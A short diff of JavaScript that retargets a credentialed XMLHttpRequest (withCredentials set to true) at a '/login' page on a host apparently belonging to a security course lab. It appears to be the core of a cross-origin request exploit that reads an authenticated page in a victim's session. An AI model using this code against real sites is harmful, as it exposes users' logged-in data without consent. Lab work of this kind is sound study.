@@ -1,6 +1,6 @@
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('get','https://192.168.0.152:5555/',true);
+req.open('get','http://cs558shell.walls.ninja:49617/login',true);
 req.withCredentials = true;
 req.send();
 
